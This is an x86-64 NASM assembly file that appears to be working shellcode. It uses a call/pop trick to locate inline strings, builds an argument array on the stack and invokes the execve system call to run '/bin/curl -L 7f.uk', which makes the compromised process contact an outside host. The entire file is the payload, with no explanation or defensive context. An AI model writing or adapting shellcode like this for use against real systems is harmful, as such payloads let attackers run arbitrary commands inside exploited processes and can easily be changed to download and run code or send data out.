[BITS 64]

; Constants
EXECVE_SYSCALL_NUM EQU 0x3B

	; Jump over argv
	call after_argv

	; argv in reverse order
	db `7f.uk\x00`
	db `-L\x00`
	db `/bin/curl\x00`

after_argv:

	; Save argv pointer
	pop rdi

	; Set envp
	xor rdx, rdx

	; Prepare argv in stack
	push rdx
	push rdi
	add rdi, 6
	push rdi
	add rdi, 3
	push rdi	; At this point RDI also points to main executable
	mov rsi, rsp
	
	; Set the syscall number into RAX
	push EXECVE_SYSCALL_NUM
	pop rax

	; Call execve
	syscall

